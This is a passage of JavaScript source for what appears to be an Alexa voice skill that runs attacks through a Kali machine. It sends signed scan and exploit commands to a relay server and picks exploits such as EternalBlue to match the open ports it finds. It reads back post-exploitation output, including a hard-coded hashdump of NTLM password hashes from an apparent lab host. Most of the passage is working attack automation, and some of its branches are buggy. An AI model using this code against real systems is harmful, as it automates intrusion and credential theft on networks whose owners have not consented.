        console.log("Made it to the IPHack or Hack intent");
        //if (this.event.request.intent.slots.IPItemOne.value) this.attributes['IPItemOne'] = this.event.request.intent.slots.IPItemOne.value; 
       // if (this.event.request.intent.slots.IPItemTwo.value) this.attributes['IPItemTwo'] = this.event.request.intent.slots.IPItemTwo.value;
       this.attributes['IPItemOne'] = process.env.LocalSubnetPrefix1;
       this.attributes['IPItemTwo'] = process.env.LocalSubnetPrefix2;
        if (this.event.request.intent.slots.IPItemThree.value) this.attributes['IPItemThree'] = this.event.request.intent.slots.IPItemThree.value;
        if (this.event.request.intent.slots.IPItemFour.value) this.attributes['IPItemFour'] = this.event.request.intent.slots.IPItemFour.value;
        
               // console.log(this.event.request.intent.slots.IPItemOne.value);
               // console.log(this.event.request.intent.slots.IPItemTwo.value);
                console.log(this.event.request.intent.slots.IPItemThree.value);
                console.log(this.event.request.intent.slots.IPItemFour.value); 
        if (
        	//this.event.request.intent.slots.IPItemOne.value 
        //&& this.event.request.intent.slots.IPItemTwo.value && 
        this.event.request.intent.slots.IPItemThree.value
        && this.event.request.intent.slots.IPItemFour.value)
            {
                console.log("about to parse ints");
                let ip1 =parseInt(this.attributes['IPItemOne'],10); 
                let ip2 =parseInt(this.attributes['IPItemTwo'],10);
                let ip3 =parseInt(this.event.request.intent.slots.IPItemThree.value,10);
                let ip4 =parseInt(this.event.request.intent.slots.IPItemFour.value,10);
                if ( ip1 <256 && ip2 <256 && ip3 <256 && ip4 <256)
                {
                    console.log("all IP portions are less than 256");
                    console.log("ip=" + ip1 + "." + ip2 + "." + ip3 + "." + ip4);
                    if ((ip1 === 10)
                    || ((ip1=== 192) && (ip2===168)) 
                    || ((ip1===172) && (ip2 >=16 && ip2 <=31))
                    || ((ip1===127)))
                    {
                        console.log("IP portions are local so we can hack it");
                        let itemSlot1 = this.attributes['IPItemOne'];
                        let itemSlot2 = this.attributes['IPItemTwo'];
                        let itemSlot3 = this.event.request.intent.slots.IPItemThree.value;
                        let itemSlot4 = this.event.request.intent.slots.IPItemFour.value;
                        let strIP =  itemSlot1 + '-' + itemSlot2 + '-' + itemSlot3 + '-' + itemSlot4;
                        console.log("about to ScanRequest with " + strIP);
                        var me = this; // pass context to the callback function
                        this.attributes['rhost']= ip1 + "." + ip2 + "." + ip3 + "." + ip4;
                        sendHackRequest(ip1,ip2,ip3,ip4);
                    }
                    else  // the IP is probably valid but in internet range
                    {
                        console.log("The IP is valid but in the internet range");
                        me.attributes.speechOutput = me.t("IPSCAN_REMOTE_IP");
                        me.attributes.repromptSpeech = me.t("IPSCAN_NOT_FOUND_REPROMPT");
                        me.emit(':ask', me.attributes.speechOutput, me.attributes.repromptSpeech);         
                        //console.log("about to call getGeoLoc(ip)" + ' with ' + strIP);
                        //var me = this;  // have to pass the context along to the callback funtion
                       // sendScanRequest(strIP);
                    }
                }
              else  // part of the IP is greater than 256
              {
                console.log('IPHackIntent bad slot value');
                let missedItem = "I missed an item.";
                if ( parseInt(this.attributes['IPItemOne'].value,10) >255) missedItem = this.t("IP_LOOKUP_TOOBIG_ONE"); 
                if ( parseInt(this.attributes['IPItemTwo'].value,10) >255) missedItem = this.t("IP_LOOKUP_TOOBIG_TWO");
                if ( parseInt(this.event.request.intent.slots.IPItemThree.value,10) >256) missedItem = this.t("IP_LOOKUP_TOOBIG_THREE");
                if ( parseInt(this.event.request.intent.slots.IPItemFour.value,10) >256) missedItem = this.t("IP_LOOKUP_TOOBIG_FOUR");
                
                this.attributes.speechOutput = this.t("IPLOOKUP_BAD_BIG_IP") + missedItem;
                this.attributes.repromptSpeech = this.t("IPLOOKUP_NOT_FOUND_REPROMPT");
               
                this.emit(':ask', this.attributes.speechOutput, this.attributes.repromptSpeech);
              }
            }
        else    // part of the IP is undefined which means we're missing one or more numbers.
        {
            console.log('IPHackIntent bad slot value');
            let missedItem = "I missed an item.";
            if (!this.attributes['IPItemOne'].value) missedItem = this.t("IP_LOOKUP_MISSING_ONE"); 
            if (!this.attributes['IPItemTwo'].value) missedItem = this.t("IP_LOOKUP_MISSING_TWO");
            if (!this.event.request.intent.slots.IPItemThree.value) missedItem = this.t("IP_LOOKUP_MISSING_THREE");
            if (!this.event.request.intent.slots.IPItemFour.value) missedItem = this.t("IP_LOOKUP_MISSING_FOUR");
                
            this.attributes.speechOutput = this.t("IPLOOKUP_BAD_MISSING_IP") + missedItem;
            this.attributes.repromptSpeech = this.t("IPLOOKUP_NOT_FOUND_REPROMPT");
               
            this.emit(':ask', this.attributes.speechOutput, this.attributes.repromptSpeech);
        }

    function sendHackRequest(ip1,ip2,ip3,ip4)
    {
        console.log("About to do the crypto hash for Hack request");
        var ipdash = ip1 + "-" + ip2 + "-" + ip3 + "-" + ip4; 
        var ip = ip1 + "." + ip2 + "." + ip3 + "." +ip4;
        var signature = crypto.createHash('md5').update(ip + process.env.SecretKey).digest("hex");
        //cmd=scan|{"targetip": "192.168.1.17", "scantype": "light"}' --data-urlencode 'sig=thisshouldberight';
        var hoststr = 'https://' + process.env.SecretURL +'/' + process.env.AlexaToKaliQueuePage +'?cmd=' + encodeURI('scan={"targetip": "' + ip +'", "scantype":"light"}') + '&sig=' + signature;
        console.log ("SendHackRequest host=" + hoststr);
        console.log('About to do HTTPS Get> ' + hoststr);
        
     https.get(hoststr, (res) => {
        console.log('HackIP statusCode:', res.statusCode);
        console.log('HackIP headers:', res.headers);
        res.on('data', (d) => {
            console.log(d);
            //gotoDoneHackRequest(ip,res.statusCode); // something good happened we don't need to wait around
            });
            // should fire when request is done
             res.on('end', function () {
               gotoDoneHackRequest(ip,res.statusCode); });
            //
            }).on('error', (e) => {
                console.log(e);
                this.emit(':ask', "I ran into a connection error while requesting the hack. See the logs for more information.", "What else can I help with?");
            //    gotoDoneScanRequest(ip,600);  // something bad happened let's call it status 600
            //**** call a another Ooops Intent to report the error!
        });
      // gotoDoneScanRequest(ip,res.statusCode); // something good happened we don't need to wait around 
    }
    function gotoDoneHackRequest(ip,status)
    {    
        const cardTitle = me.t('IPSCAN_DISPLAY_CARD_TITLE', ip);
        console.log("DoneHackRequest status=" + status);
        if (status ===200) 
        {
               // me.attributes.speechOutput = me.t('IPSCAN_HACK_STARTED'); //"The hack is on the way.";  
                //me.attributes.repromptSpeech = me.t('IPSCAN_REPEAT_MESSAGE');
                console.log("about to set me attributes");
                me.attributes['attribname'] = "hack";
                me.attributes['attribvalue'] = "ReadCommandFromKali"; //"ReadCommandFromKali";
                me.attributes['saythis'] = "Starting recon on target. Here's a little music to keep you in the hacking mood. ";
				console.log("about to emit PlaySomethingFun");
				me.emitWithState("PlaySomethingFunIntent"); // delay until the scan is done
				console.log("Got back from PlaySomethingFun");
                me.emitWithState(me.attributes.attribvalue);
               // me.emit(':askWithCard', me.attributes.speechOutput , me.attributes.repromptSpeech, cardTitle, me.attributes.speechOutput);  
			// wait until response
			//setTimeout(getPortsScanned,15000);

        } 
        else 
        {   // 404 or other error response code
            console.log("Lookup failed: ip=" + ip + " status code=" + status);
            let speechOutput = me.t('IPSCAN_NOT_FOUND_MESSAGE');
            const repromptSpeech = me.t('IPSCAN_NOT_FOUND_REPROMPT');
            if (ip) 
            {
                speechOutput += me.t('IPSCAN_NOT_FOUND_WITH_ITEM_NAME', ip);
            } else 
            {
                speechOutput += me.t('IPSCAN_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            // speechOutput += repromptSpeech;
            console.log('IPLookupIntent>' + ip);
            me.attributes.speechOutput = speechOutput;
            me.attributes.repromptSpeech = repromptSpeech;
               
            me.emit(':ask', speechOutput, repromptSpeech);
        }
    }
},
// end IPHackIntent ------------------------------

'PlaySomethingFunIntent': function() {
	var responsecode = "";
	try{
		console.log("THIS.EVENT = " + JSON.stringify(this.event) );
		if (! this.attributes['saythis'] ){ responsecode = " <audio src='https://" + process.env.PlaySomethingFun + "'></audio> ";}
		else {
			responsecode = this.attributes['saythis'] + " <audio src='https://" + process.env.PlaySomethingFun + "'></audio> ";
		}
	//var responsecode="waiting for " + this.attributes['attribname'] + " to complete <audio src='https://" + process.env.RickRollPath + "'></audio> ";
	} catch(error) {
	 console.log("PSFI - No response from Kali yet");
	 responsecode="there is no update from Kali yet <audio src='https://" + process.env.RickRollPath + "'></audio> ";
	}
	finally{
	//this.emit(":ask","Done that now.","Is there anything else you would like me to do?");
	this.attributes.repromptSpeech = "";  // don't say anything if we're just going to the next function in the state queue
	this.emit(':ask', responsecode, "If you want to find out about how the hack is going, just say How's the hack going?");
	}
	//try {
	//	this.emitWithState(this.attributes['attribvalue']);
	//}catch(err2)
	//{
	//	console.log("error = "); console.log(err2);
	//}
},

'exploitres': function() { 
	console.log("<exploitres> check on hack!");
	// **** a test string to see if you can parse the returning shell info appropriately... if you make changes to the parser, you can use 
	// **** the shackres string as a quick sanity check by calling this function from a test
	//var shackres = "";
		var shackres ='{"responsetype": "exploitres", "openports": [], "portscanres": "", "exploitres": "success", "searchres": "", ' +
		'"usepayloadres": "[*] Obtaining the boot key... Server username: METASPLOITABLE3\vagrant ...got system via technique 1 ' +
		'(Named Pipe Impersonation (In Memory/Admin)). [*] Calculating the hboot key using SYSKEY 4fe4ffce3ea2a8d145014ca797aeaf89... ' +
		'[*] Obtaining the user list and keys... [*] Decrypting user keys... [*] Dumping password hints... No users with password hints ' +
		'on this system [*] Dumping password hashes... Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b::: sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035::: leah_organa:1003:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028::: luke_skywalker:1004:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a::: han_solo:1005:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951::: artoo_detoo:1006:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4::: c_three_pio:1007:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee::: ben_kenobi:1008:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859::: darth_vader:1009:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0::: anakin_skywalker:1010:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa::: jarjar_binks:1011:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4::: lando_calrissian:1012:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f::: boba_fett:1013:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9::: jabba_hutt:1014:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76::: greedo:1015:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db::: chewbacca:1016:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8::: kylo_ren:1017:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001::: ", "shellres": "", "getuidres": "", "windows": "True", "exploit": "", "rhost": "192.168.1.56", "lhost": "192.168.137.197", "payload": "", "rport": "8000", "lport": "4000", "exploits": "", "sessions": "1", "postmodule": "hashdump", "error": "Success", "mstatus": "I successfully retrieved user names and hashes and took the liberty of printing them to your Kali terminal."}|sig=sig=somesignature';
	
	var hackres = JSON.parse(shackres);
	if (hackres.responsetype == "exploitres") 
	{
		//	for some reason the string is getting characters in it that are not friendly to JSON. TODO: debug JSON output on Python side
//  parse the homebrew message into message and signature
// TODO: validate signature versus keyed hash with key being Alexa in app config
	var splitme = shackres.split('|');
	shackres = splitme[0]; // left side
	var sig = splitme[1];  // right side
	
	console.log('About to do for loop');
//	var s = shackres.split('');
	// for some reason replace of some character groups won't work in string replace TODO: look into this later for now no time to debug crappy string handling
   // for (var i = 0; i < s.length; i++) {
        //if (s[i].charCodeAt(0) < 20) s[i] = " ";
        //if (s[i] == "[" && s[i+1] == "*" && s[i+2] == "]")
        //  {s[i] = " "; s[i+1] = " "; s[i+2]= " ";} 
        //if (s[i] == "(") s[i] = " ";
        //if (s[i] == ")") s[i] = " ";
       // if (s[i] == "/") s[i] = " ";
       // if (s[i] == "_") s[i] = " "; 
 //   }
 //   console.log('about to join string back from array');
 //       shackres = s.join('');
    
     
//console.log('about to parse JSON');
//var hackres = JSON.parse(newres);
//console.log('about to assign the value of usepayloadres');

//	} 
//	else 
//	{ 
//		this.emit(":ask","I got a response type from Kali of " + hackres.reponsetype, "What would you like me to do?");
//	}
	
	//
	//this.emitWithState("SessionEndedRequest");
	}
},

'SetLPortIntent': function () {
  // give me an exploit for port X
  //this.attributes.lport = //
},

'SetRPortIntent': function () {
  // give me an exploit for port X
  //this.emitWithState('ReadCommandFromKali');
},

'SetLHostIntent': function () {
  // give me an exploit for port X
  //this.emitWithState('ReadCommandFromKali');
},

'SetRHostIntent': function () {
  // give me an exploit for port X
  //this.emitWithState('ReadCommandFromKali');
},

'UsePayloadIntent': function () {
  // give me an exploit for port X
  //this.emitWithState('ReadCommandFromKali');
},

'UseShellCommandIntent': function () {
  // give me an exploit for port X
  //this.emitWithState('ReadCommandFromKali');
},

'GetShellCommendIntent': function (){
  // for IceCast, SMB, FTP, RDP etc     	
   //this.emit(':ask', "The shell command is " + this.attributes['command'], ""); // ask with no reprompt to keep the session open  
},

'UsePostExploitModuleIntent': function () {
  // for now we'll use the good standard post exploit modules
  // give me an exploit for port X
  //this.emitWithState('ReadCommandFromKali');
},

'GetPostExploitModuleIntent': function (){
  // for IceCast, SMB, FTP, RDP etc     	
   //this.emit(':ask', "The post exploit module is " + this.attributes['postexploitmodule'], ""); // ask with no reprompt to keep the session open  
},

'UseModuleIntent': function () {
  // give me an exploit for port X
  //this.emitWithState('ReadCommandFromKali');
  
},
'GetModuleIntent': function (){
  // for IceCast, SMB, FTP, RDP etc     	
  // this.emit(':ask', "The post exploit module is " + this.attributes['postexploitmodule'], ""); // ask with no reprompt to keep the session open  
	
},

//'UseExploitIntent': function () {
'exploit': function () {
	  console.log("Exploit matching function");
  // Choose list of exploits for port X, Y, Z
 // if (this.attributes['rhost'] === '8000') {  this.attributes['exploit'] = 'windows\http_header\icecast:8000'; }
 //this.attributes['exploit']= 'crap\crap:10';
if (this.attributes['rhost'] === '445') { this.attributes['exploit'] = 'windows\smb\ms17_010_eternalblue:445'; }
console.log("Open ports=" + this.attributes.openports + "  Exploit rhost is:" + this.attributes.rhost);
const explDB = this.t('EXPLOITPORTS');
console.log("JSON of explDB=" + JSON.stringify(explDB));
var jend = Object.keys(explDB).length;
 console.log("Length of explDB = " + jend);
console.log("exploitDB items=" + explDB);

  var iend=0;
  var windows = false;  //Linux
  var openports = this.attributes.openports;
 for (var w in openports)
  	{
  	    if(openports[w].service.match(/Microsoft/i)) windows = true; //Windows
  	  //  if(openports[w].match(/Microsoft/i)) windows = true; //Windows
  	}
  console.log("Windows=" + windows);
  if (openports.length > 0) iend= openports.length;
  
  if (!openports) { console.log("Openports are not set, so they can't be parsed!");}
  console.log("open ports length=" + iend + "open ports = " + JSON.stringify(openports));

  var exploitarray = "";
  var poor;
  for (var i = 0; i < iend; i++)
  {
  	console.log("i= " + i);
  	poor = openports[i].port;
  	
  	console.log("Looping through open ports: " + poor); // JSON.stringify(poor));
  	// loop through the entire exploit json object to get all the matches possible
  	//for (var j = 0; j < jend; j++)
  	for (var j in explDB)
  	{
  	//	console.log("j=" + explDB[j]);
  	//	console.log("->exploit port:" + explDB[j] + " poor =" + poor);
  		if (explDB[j] == poor) {
  			// then add to the new array holding exploits to try
  			console.log("DB port = " + explDB[j] + "=" + poor);
  			var words = openports[i].service.split(" ");
  			console.log("words are: " + words[0] + "," + words[1]);
  			if (windows === true && (j.match(/windows/i) ))  // we don't want to match multi yet
  			{ 
  			    console.log("Windows matched");
  			    var s = j.toString();
  			    console.log("Exploit line (s) =" + s);
  			   if (s.indexOf(words[0].toLowerCase()) > -1 ) {
  			   	console.log(words[0] + " or " + words[1] + " matched");
  			   	// windows is try and port is the same and a word matches so it's at the start of the list as a most likely target
  			   	exploitarray = '{"exploit":"' + s + '", "port":"' + poor + '"},' + exploitarray;
  			    console.log("exploitarray =" + exploitarray);
  			   }
  			   // windows is true and the port is the same so add it to the end of the list
  			   else{ exploitarray = exploitarray + '{"exploit":"' + s + '", "port":"' + poor + '"},'; }
  			   
  			}
  			if (windows === false && ( j.match(/linux/i) )) //If not Win and Linux in the string YAY! but we don't want to match multi or other weird types yet
  			{   			   
  				console.log("Linux matched");
  			    var ls = j.toString();
  			   if (ls.indexOf(words[0].toLowerCase()) > -1 ) {
  			   	console.log(words[0] + " or " + words[1] + " matched");
  			    exploitarray = exploitarray + '{"' + j + '":"' + poor + '"},';
  			    console.log("exploitarray =" + exploitarray);
  				}
  			} 
	
  		}
  	}
  //	console.log("NewExploitArray = " + newexplarray);
  }
  	var newexplarray = exploitarray.substr(0, exploitarray.length-1); // chop the trailing comma off
  	newexplarray = "[" + newexplarray + "]";
  console.log("Exploit array= " + JSON.stringify(newexplarray));  console.log("Exploit array= " + JSON.stringify(newexplarray));
  
  // set the global state vars and push the state to Kali
  this.attributes['attribname'] = "exploit";
  console.log ('Setting state machine to exploit');
  this.attributes['attribvalue'] = newexplarray; //exploit name
  //console.log ("About to save state");
  //this.emit(':saveState', true);
  console.log ("Going to emit SendToKali to wait for loot data or failure to be returned.");
  // we can't emit a new event and say something... so push the queue event with the current state data
  this.emitWithState('SendToKali');
},
// Intent to send command to Kali helps keep the asynch of the web request contained
 'SendToKali': function()
    {
        //console.log("About to do the crypto hash for Hack request");
        var signature = crypto.createHash('md5').update(this.attributes['attribvalue'] + process.env.SecretKey).digest("hex");
        var hoststr = "https://" + process.env.SecretURL +"/" + process.env.AlexaToKaliQueuePage +"?cmd=" + this.attributes['attribname'] + "=" + this.attributes['attribvalue'] + "&sig=" + signature;
        console.log('About to do HTTPS Get> ' + hoststr);
        var me = this;
     https.get(hoststr, (res) => {
        console.log('statusCode:', res.statusCode);
        console.log('headers:', res.headers);
        res.on('data', (d) => {
            console.log(d);
            });
            // should fire when request is done
             res.on('end', function () {
              // gotoDoneHackRequest(ip,res.statusCode); 
             //	this.emitWithState(this.attributes['returnIntent']);
             	me.emitWithState("PollKali");
             });
            //
            }).on('error', (e) => {
                console.log(e);
                this.emit(':ask', "An error was encountered trying to read the queue. See the logs for more information.", "What else can I help with?");
            //    gotoDoneScanRequest(ip,600);  // something bad happened let's call it status 600
            //**** call a another Ooops Intent to report the error!
        });
      // gotoDoneScanRequest(ip,res.statusCode); // something good happened we don't need to wait around 
    },

'PollKali': function() {
	// keep track of how many times we've waited for Kali. A 3 count should be more than enough.
	console.log("in PollKali");
	if (!this.attributes['pollKaliCount']) this.attributes['pollKaliCount'] = 0; else this.attributes['pollKaliCount']++; 

	if(this.attributes['pollKaliCount'] < 3) {
		console.log("About to PlaySomethingFun and then ReadCommandFromKali");
	//	this.emitWithState('PlaySomethingFun'); //delay a bit
			console.log("About to ReadCommandFromKali, pollKaliCount is:" +this.attributes['pollKaliCount']  );
		this.emitWithState ('ReadCommandFromKali'); // try to poll Kali for a response again
		// if the ReadCommandFromKali was successful, it should have parsed it into a new state machine state and trigger the next stage of the process
		// ie:  "exploit", "postexploit", "stop"  -- the next state can't be "scan" because that's triggered by a voice command event
		}
	else
		{// we have reached the limit of our patience and wallet
			console.log("We tried 3 times and are done waiting in PollKali");
			console.log("Ending session");
			this.emitWithState('SessionEndedRequest');
		}
},

// Intent to get command from Kali helps keep the asynch nature of the web request contained
'ReadCommandFromKali': function() {  // (this,attribname,returnIntentthis) could also take a callback function but we can do what we need without that
        console.log("In read command from Kali");
        //var signature = crypto.createHash('md5').update(process.env.SecretKey).digest("hex");
        var hoststr = "https://" + process.env.SecretURL +"/" + process.env.AlexaReadQueuePage;
        console.log (process.env.AlexaReadQueuePage + " host=" + hoststr);
		// call the function with the callback
	var	me = this;
	getWebPage(callbackGetWebPage,me); 
//! comment this out after test	-------------------- snip ---------------------
		//	var test = '{"responsetype": "exploitres", "openports": [], "portscanres": "", "exploitres": "...got system via technique 1 Named Pipe Impersonation In Memory Admin . Obtaining the boot key... Calculating the hboot key using SYSKEY 4fe4ffce3ea2a8d145014ca797aeaf89... Obtaining the user list and keys... Decrypting user keys... Dumping password hints...No users with password hints on this system Dumping password hashes...Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::sshd server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::leah organa:1003:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028:::luke skywalker:1004:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a:::han solo:1005:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951:::artoo detoo:1006:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::c three pio:1007:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee:::ben kenobi:1008:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::darth vader:1009:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0:::anakin skywalker:1010:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::jarjar binks:1011:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4:::lando calrissian:1012:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f:::boba fett:1013:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9:::jabba hutt:1014:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76:::greedo:1015:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db:::chewbacca:1016:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::kylo ren:1017:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001:::", "searchres": "", "usepayloadres": "", "shellres": "", "getuidres": "Server username: METASPLOITABLE3 slash vagrant", "windows": "True", "exploit": "", "rhost": "192.168.1.56", "lhost": "192.168.137.197", "payload": "", "rport": "8000", "lport": "4000", "exploits": "", "sessions": "1", "postmodule": "hashdump", "error": "Success", "mstatus": "I successfully retrieved user names and hashes and took the liberty of printing them to your Kali terminal."}|sig=sig=somesignature';
        //	 var tbody = test.split("|");
        //	 var news = tbody[0];
  		//	var nnews = news.replace("\\", " slash ");  // fix any single back-slashes that would appear in a file or domain so it doesn't mess up JSON
      
        //	 console.log("!!! Payload= " + nnews); // use just the signature part
        //	 var parsed = JSON.parse(nnews);
		//	 callbackGetWebPage(parsed,me);
// end comment th is out after test ------------ end snip ---------------------
		//end function
		
	function getWebPage(callback,me) {
    	return https.get({
        	host: process.env.SecretURL,
    	    path: "/" + process.env.AlexaReadQueuePage
	 }, function(response) {
    	    // Continuously update stream with data
    	    var body = '';
    	  response.on('data', function(d) {
            body += d;
    	    });
    	 response.on('end', function() {
        	 if(body != ""){
        	 body = body.split("|");
        	 console.log("Payload= " + body[0]); // use just the signature part
        	 body[0] = body[0].replace(/\\/g, " slash ");  // fix any single back-slashes that would appear in a file or domain so it doesn't mess up JSON
        	 var parsed = JSON.parse(body[0].toString());
        	 console.log("Parsed body body = "+parsed.toString()+"\n\r\-->");
        	    //var parsed = JSON.parse(body);
    	     callback(parsed,me);
        	 }
        	 else {
        	 	console.log ("No queued messages from Kali");
        	 	me.attributes['responsetype'] == "noresponse";
        	 	me.emit(":ask","I don't have an update from Kali yet.", "In the mean time would you like me to answer something else or maybe Rick roll someone?");
				console.log(me.attributes['mstatus']);
        	 } 
        	 
    	 });
    	});
	}
	// do the synchronous work we need done before we get our stack jacked by Node
	function callbackGetWebPage(databack,me) { 
	  console.log("callback reached with databack=" + databack); 
	  //console.log(databack['rhost']);
					// set the variables in the session
					me.attributes['responsetype'] = databack['responsetype'] || "0";
					me.attributes['rhost'] = databack['rhost'] || "0";
	          		me.attributes['windows'] = databack['windows'] || "0";
        			me.attributes['exploit'] = databack['exploit'] || "0";
        			me.attributes['lhost'] = databack['lhost'] || "0";
        			me.attributes['payload'] = databack['payload'] || "0";
        			console.log("DATABACK-RPORT=>" + databack['rport'] + "<");
        			if (databack['rport']) me.attributes['rport'] = databack['rport'] || "0";
        			if (databack['lport']) me.attributes['lport'] = databack['lport'] || "0";
        			me.attributes['sessions'] = databack['sessions'] || "0";
        			me.attributes['postmodule'] = databack['postmodule'] || "0";
        			me.attributes['error'] = databack['error'] || "0";
        			me.attributes['mstatus'] = databack['mstatus'] || "0";
        			me.attributes['openports'] = databack['openports'] || "0";
        			me.attributes['portscanres'] = databack['portscanres'] || "0";
        			me.attributes['exploitres'] = databack['exploitres'] || "0";
        			
        		//	me.attributes['openports'] = me.attributes['openports']; // it will either be '0' or an array of ports
        			
        			if (me.attributes.openports.length > 0) console.log("open ports from session = " + me.attributes.openports[1].service);
        			console.log("tempResponse.openports = " + JSON.stringify( databack["openports"]));
					console.log('Session rhost = ' + me.attributes['rhost']);
					console.log('Session rport = ' + me.attributes['rport']);
					console.log('Session lhost = ' + me.attributes['lhost']);
					console.log('Session lport = ' + me.attributes['lport']);
					console.log('Session rhost = ' + me.attributes['rhost']);
					console.log('Session portscanres = ' + me.attributes['portscanres']);
					console.log('Session openports = ' + me.attributes['openports']);
					console.log('Session windows = ' +	me.attributes['windows']); 
        			console.log('Session exploit = ' + me.attributes['exploit']); // this will end up being multiple exploits in a split string | delimited
        			console.log('Session exploitres =' + me.attributes['exploitres']);
        			console.log('Session payload = ' + me.attributes['payload']);
        			console.log('Session sessions = ' + me.attributes['sessions']);
        			console.log('Session postmodule = ' + me.attributes['postmodule']);
        			console.log('Session mstatus = ' + me.attributes['mstatus']);
        			// TODO: change the intent name of this next call to whatever we settle on for the startexploiting call
        console.log("RCFK Responsetype is :" + me.attributes['responsetype'] + " about to emit exploit event with Me copy of session");
		// MAKE SURE PROPER STATE IS SET for the next event
		// Alexa sends Kali a "portscan" and Kali sends back the ports with the command "exploit"
		if (me.attributes['responsetype'] == "portscan") me.emitWithState('exploit'); // we just got a port scan back so pick and send exploits to Kali
		if (me.attributes['responsetype'] == "exploitres") //me.emitWithState('exploitres');
        {
        	var newres = me.attributes['exploitres'].replace("  ","");
    		newres = newres.replace("username:", "username is");
			newres = newres.replace( /:(.+?):::/g, " " );
			newres = newres.replace(/SYSKEY(.+?)\.\.\./g,"Sys Key");
			
			newres = newres.replace( /:(.+?):::/g, " " );
			newres = newres.replace(/SYSKEY(.+?)\.\.\./g,"Sys Key");
			console.log("newres parsed postexploit is: " + newres);
			me.emit(":ask",newres, "What what else can I do for you?");
		}
        
        			console.log('Done ReadCommandFromKali callback');

	}
},

'shell': function() {
	console.log("Result of READ SHELL is: " + this.attributes['mstatus'] + " error = " + this.attributes['error']);
	this.attributes.speechOutput = this.attributes['mstatus'];
	if (this.attributes['error'] != 0) this.attributes.speechOutput = "The exploit was successuful."; else this.attributes.speechOutput = "The exploits didn't work on the target system.";
	this.attributes.speechOutput = "The exploit was " + this.attributes['mstatus'];
        this.emit(':askWithCard', this.attributes.speechOutput , "What else can I do for you?", "Exploit Results", this.attributes.speechOutput);  

},

'GetExploitIntent': function() {
	this.attributes.speechOutput = this.attributes['exploit'];
        this.emit(':askWithCard', this.attributes.speechOutput , this.attributes.repromptSpeech, "Current Exploit", this.attributes.speechOutput);  
},

'GetPostExploitIntent': function () {
	// list processes list files, dump hashes, get system, whoami, etc.
		this.attributes.speechOutput = this.attributes['posteploit'];
        this.emit(':askWithCard', this.attributes.speechOutput , this.attributes.repromptSpeech, "Use Exploit", this.attributes.speechOutput);  
},
'GetPayloadIntent': function () {
	// list processes list files, dump hashes, get system, whoami, etc.
		this.attributes.speechOutput = this.attributes['payload'];
        this.emit(':askWithCard', this.attributes.speechOutput , this.attributes.repromptSpeech, "Use Exploit", this.attributes.speechOutput);  
},
'GetRHostIntent': function () {
	// list processes list files, dump hashes, get system, whoami, etc.
		this.attributes.speechOutput = this.attributes['rhost'];
        this.emit(':askWithCard', this.attributes.speechOutput , this.attributes.repromptSpeech, "Use Exploit", this.attributes.speechOutput);  
},
'GetLHostIntent': function () {
	// list processes list files, dump hashes, get system, whoami, etc.
		this.attributes.speechOutput = this.attributes['lhost'];
        this.emit(':askWithCard', this.attributes.speechOutput , this.attributes.repromptSpeech, "Use Exploit", this.attributes.speechOutput);  
},
'GetRPortIntent': function () {
	// list processes list files, dump hashes, get system, whoami, etc.
		this.attributes.speechOutput = this.attributes['rport'];
        this.emit(':askWithCard', this.attributes.speechOutput , this.attributes.repromptSpeech, "Use Exploit", this.attributes.speechOutput);  
},
'GetLPortIntent': function () {
